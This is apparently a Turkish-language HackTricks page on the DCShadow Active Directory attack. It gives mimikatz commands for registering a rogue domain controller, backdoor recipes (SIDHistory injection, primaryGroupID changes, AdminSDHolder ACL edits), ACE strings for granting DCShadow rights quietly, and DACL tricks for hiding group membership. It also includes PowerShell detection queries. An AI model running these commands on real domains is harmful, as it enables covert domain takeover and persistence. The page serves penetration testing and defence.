# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Temel Bilgiler

AD içinde **yeni bir Domain Controller** kaydeder ve bunu, belirli nesnelerdeki **öznitelikleri** (SIDHistory, SPN'ler...) herhangi bir **değişiklik günlüğü** bırakmadan **push etmek** için kullanır. **DA** ayrıcalıklarına sahip olmanız ve **root domain** içinde bulunmanız gerekir.\
Yanlış veriler kullanırsanız oldukça kötü görünümlü logların oluşacağını unutmayın.<sup>[[2]](#references)</sup>

Saldırıyı gerçekleştirmek için 2 mimikatz örneğine ihtiyacınız vardır. Bunlardan biri SYSTEM ayrıcalıklarıyla RPC sunucularını başlatır (gerçekleştirmek istediğiniz değişiklikleri burada belirtmeniz gerekir), diğer örnek ise değerleri push etmek için kullanılır:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Notice that **`elevate::token`**, `mimikatz1` session'da çalışmaz; çünkü bu, thread'in ayrıcalıklarını yükseltir, ancak bizim **process'in ayrıcalığını** yükseltmemiz gerekir.\
Ayrıca bir "LDAP" object seçebilirsiniz: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Değişiklikleri bir DA veya aşağıdaki minimal izinlere sahip bir user ile gönderebilirsiniz:

- **domain object** içinde:
- _DS-Install-Replica_ (Domain'de Replica ekleme/kaldırma)
- _DS-Replication-Manage-Topology_ (Replication Topology'yi yönetme)
- _DS-Replication-Synchronize_ (Replication Synchronization)
- **Configuration container** içindeki **Sites object** (ve alt öğeleri):
- _CreateChild and DeleteChild_
- DC olarak kayıtlı **computer object**:
- _WriteProperty_ (Write değil)
- **target object**:
- _WriteProperty_ (Write değil)

Ayrıcalıksız bir user'a bu izinleri vermek için [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) kullanabilirsiniz (bunun bazı log'lar bırakacağını unutmayın). Bu, DA ayrıcalıklarına sahip olmaktan çok daha kısıtlayıcıdır.\
Örneğin: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Bu, _**student1**_ username'i _**mcorp-student1**_ makinesinde log on olduğunda, _**root1user**_ object'i üzerinde DCShadow izinlerine sahip olacağı anlamına gelir.

## Using DCShadow to create backdoors
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Primary group abuse, enumeration gaps, and detection

- `primaryGroupID`, group `member` listesinden ayrı bir attribute'tur. DCShadow/DSInternals bunu doğrudan yazabilir (ör. **Domain Admins** için `primaryGroupID=512` ayarlamak); on-box LSASS enforcement olmadan çalışır, ancak AD kullanıcıyı yine de **taşır**: PGID değiştirmek, önceki primary group üyeliğini her zaman kaldırır (aynı davranış tüm hedef gruplar için geçerlidir); bu nedenle eski primary-group üyeliğini koruyamazsınız.<sup>[[1]](#references)</sup>
- Varsayılan araçlar, bir kullanıcının mevcut primary group'undan çıkarılmasını engeller (`ADUC`, `Remove-ADGroupMember`); bu nedenle PGID değiştirmek genellikle doğrudan directory write işlemleri gerektirir (DCShadow/`Set-ADDBPrimaryGroup`).
- Membership reporting tutarsızdır:
- **Primary-group'dan türetilen üyeleri içerir:** `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **Primary-group'dan türetilen üyeleri içermez:** `Get-ADGroup "Domain Admins" -Properties member`, `member` attribute'unu inceleyen ADSI Edit, `Get-ADUser <user> -Properties memberOf`.
- Primary group'un kendisi nested ise recursive kontroller primary-group üyelerini gözden kaçırabilir (ör. kullanıcının PGID'si Domain Admins içindeki nested bir grubu gösteriyorsa); `Get-ADGroupMember -Recursive` veya LDAP recursive filters, primary group'ları açıkça çözümlemediği sürece bu kullanıcıyı döndürmez.
- DACL tricks: attackers, user üzerinde `primaryGroupID` için (veya AdminSDHolder dışındaki gruplarda group `member` attribute'u üzerinde) **deny ReadProperty** uygulayarak effective membership bilgisini çoğu PowerShell query'sinden gizleyebilir; `net group` üyeliği yine de çözümler. AdminSDHolder-protected gruplar bu deny ayarlarını sıfırlar.

Detection/monitoring örnekleri:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Ayrıcalıklı grupları, `Get-ADGroupMember` çıktısını `Get-ADGroup -Properties member` veya ADSI Edit ile karşılaştırarak çapraz kontrol edin; böylece `primaryGroupID` veya gizli özniteliklerin neden olduğu tutarsızlıkları yakalayabilirsiniz.<sup>[[1]](#references)</sup>

## Shadowception - DCShadow kullanarak DCShadow izinleri verme (değiştirilmiş izin logları olmadan)

Aşağıdaki ACE'leri kullanıcımızın SID'si ile sona eklememiz gerekiyor:<sup>[[2]](#references)</sup>

- Domain nesnesinde:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Saldırgan bilgisayar nesnesinde: `(A;;WP;;;UserSID)`
- Hedef kullanıcı nesnesinde: `(A;;WP;;;UserSID)`
- Configuration container içindeki Sites nesnesinde: `(A;CI;CCDC;;;UserSID)`

Bir nesnenin mevcut ACE'sini almak için: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Bu durumda yalnızca bir değil, **birden fazla değişiklik** yapmanız gerektiğine dikkat edin. Bu nedenle **mimikatz1 oturumunda** (RPC sunucusu), yapmak istediğiniz her değişiklikle birlikte **`/stack` parametresini** kullanın. Böylece rogue sunucudaki tüm yığılmış değişiklikleri gerçekleştirmek için yalnızca bir kez **`/push`** kullanmanız yeterli olacaktır.

[**ired.team'de DCShadow hakkında daha fazla bilgi.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)<sup>[[2]](#references)</sup>

## References

- [1] [TrustedSec - Primary Group davranışı, raporlama ve exploitation maceraları](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [2] [ired.team'de DCShadow write-up'ı](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
